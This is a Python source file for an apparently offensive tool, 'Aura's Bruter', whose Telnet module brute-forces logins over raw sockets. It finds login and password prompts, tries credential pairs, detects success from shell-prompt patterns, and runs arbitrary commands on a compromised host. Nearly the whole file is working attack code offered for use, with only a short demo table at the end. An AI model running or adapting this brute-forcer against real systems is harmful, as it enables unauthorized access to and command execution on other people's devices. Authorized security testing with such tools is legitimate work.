#!/usr/bin/env python3
"""
Aura's Bruter - Telnet Attack Module
Telnet brute force using raw sockets (Python 3.13 compatible)
"""

import socket
import time
from typing import Optional, Tuple
from dataclasses import dataclass


@dataclass
class TelnetResult:
    """Result of a Telnet connection attempt."""
    success: bool
    username: str
    password: str
    error: Optional[str] = None
    banner: Optional[str] = None


class TelnetAttacker:
    """
    Telnet brute force attack module using raw sockets.
    Compatible with Python 3.13+ (telnetlib was removed).
    """
    
    # Common login/password prompts
    LOGIN_PROMPTS = [
        b"login:",
        b"Login:",
        b"LOGIN:",
        b"username:",
        b"Username:",
        b"user:",
        b"User:",
    ]
    
    PASSWORD_PROMPTS = [
        b"password:",
        b"Password:",
        b"PASSWORD:",
        b"pass:",
        b"Pass:",
    ]
    
    # Success/failure indicators
    SUCCESS_PATTERNS = [
        b"$",
        b"#",
        b">",
        b"welcome",
        b"Welcome",
        b"Last login",
        b"logged in",
    ]
    
    FAILURE_PATTERNS = [
        b"incorrect",
        b"failed",
        b"denied",
        b"invalid",
        b"wrong",
        b"bad",
        b"Login incorrect",
        b"Authentication failed",
    ]
    
    def __init__(
        self,
        host: str,
        port: int = 23,
        timeout: float = 10.0,
        max_retries: int = 3
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self._banner = None
    
    def check_port_open(self) -> bool:
        """Check if the Telnet port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _recv_until(self, sock: socket.socket, patterns: list, timeout: float = 5.0) -> Tuple[bytes, int]:
        """Receive data until one of the patterns is found."""
        sock.settimeout(timeout)
        data = b""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
                
                # Check for patterns
                for i, pattern in enumerate(patterns):
                    if pattern.lower() in data.lower():
                        return data, i
                        
            except socket.timeout:
                break
            except Exception:
                break
        
        return data, -1
    
    def get_banner(self) -> Optional[str]:
        """Get the Telnet server banner."""
        if self._banner:
            return self._banner
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            # Read initial data
            data, _ = self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
            self._banner = data.decode('utf-8', errors='ignore').strip()
            
            sock.close()
            return self._banner
        except Exception:
            return None
    
    def try_credentials(self, username: str, password: str) -> TelnetResult:
        """
        Try to authenticate with the given credentials.
        
        Args:
            username: Telnet username
            password: Telnet password
            
        Returns:
            TelnetResult with success status and details
        """
        for attempt in range(self.max_retries):
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.host, self.port))
                
                # Wait for login prompt
                data, idx = self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
                
                if idx < 0:
                    sock.close()
                    if attempt < self.max_retries - 1:
                        continue
                    return TelnetResult(
                        success=False,
                        username=username,
                        password=password,
                        error="No login prompt found"
                    )
                
                # Send username
                sock.send(username.encode('utf-8') + b"\r\n")
                time.sleep(0.3)
                
                # Wait for password prompt
                data, idx = self._recv_until(sock, self.PASSWORD_PROMPTS, timeout=self.timeout)
                
                if idx < 0:
                    sock.close()
                    return TelnetResult(
                        success=False,
                        username=username,
                        password=password,
                        error="No password prompt found"
                    )
                
                # Send password
                sock.send(password.encode('utf-8') + b"\r\n")
                time.sleep(0.5)
                
                # Check response
                try:
                    sock.settimeout(2.0)
                    response = b""
                    while True:
                        try:
                            chunk = sock.recv(1024)
                            if not chunk:
                                break
                            response += chunk
                        except socket.timeout:
                            break
                except Exception:
                    pass
                
                sock.close()
                
                # Check for failure patterns first
                for pattern in self.FAILURE_PATTERNS:
                    if pattern.lower() in response.lower():
                        return TelnetResult(
                            success=False,
                            username=username,
                            password=password,
                            error="Authentication failed"
                        )
                
                # Check for success patterns
                for pattern in self.SUCCESS_PATTERNS:
                    if pattern in response:
                        return TelnetResult(
                            success=True,
                            username=username,
                            password=password,
                            banner=self._banner
                        )
                
                # If no login prompt again, might be success
                has_login_prompt = any(p.lower() in response.lower() for p in self.LOGIN_PROMPTS)
                if not has_login_prompt and len(response) > 0:
                    # Check if we got a shell prompt
                    if b"$" in response or b"#" in response or b">" in response:
                        return TelnetResult(
                            success=True,
                            username=username,
                            password=password,
                            banner=self._banner
                        )
                
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Authentication failed"
                )
                
            except socket.timeout:
                if sock:
                    sock.close()
                if attempt < self.max_retries - 1:
                    continue
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection timeout"
                )
                
            except socket.error as e:
                if sock:
                    sock.close()
                if attempt < self.max_retries - 1:
                    continue
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Socket error: {e}"
                )
                
            except Exception as e:
                if sock:
                    sock.close()
                return TelnetResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Unexpected error: {e}"
                )
        
        return TelnetResult(
            success=False,
            username=username,
            password=password,
            error="Max retries exceeded"
        )
    
    def execute_command(self, username: str, password: str, command: str) -> Optional[str]:
        """
        Execute a command after successful authentication.
        
        Returns:
            Command output or None if failed
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            # Login
            self._recv_until(sock, self.LOGIN_PROMPTS, timeout=self.timeout)
            sock.send(username.encode('utf-8') + b"\r\n")
            
            self._recv_until(sock, self.PASSWORD_PROMPTS, timeout=self.timeout)
            sock.send(password.encode('utf-8') + b"\r\n")
            
            # Wait for shell prompt
            time.sleep(1)
            
            # Send command
            sock.send(command.encode('utf-8') + b"\r\n")
            time.sleep(1)
            
            # Read response
            response = b""
            sock.settimeout(2.0)
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.send(b"exit\r\n")
            sock.close()
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception:
            if sock:
                sock.close()
            return None
    
    def get_server_info(self) -> dict:
        """Get information about the Telnet server."""
        return {
            "host": self.host,
            "port": self.port,
            "banner": self.get_banner(),
            "port_open": self.check_port_open()
        }


if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table
    
    console = Console()
    
    console.print("[yellow]Telnet Attack Module - Demo Mode[/yellow]")
    console.print("[dim]Python 3.13+ compatible (uses raw sockets)[/dim]")
    
    table = Table(title="TelnetAttacker Methods")
    table.add_column("Method", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("check_port_open()", "Check if Telnet port is accessible")
    table.add_row("get_banner()", "Retrieve Telnet server banner")
    table.add_row("try_credentials(user, pass)", "Attempt authentication")
    table.add_row("execute_command(user, pass, cmd)", "Run command after auth")
    table.add_row("get_server_info()", "Get comprehensive server info")
    
    console.print(table)
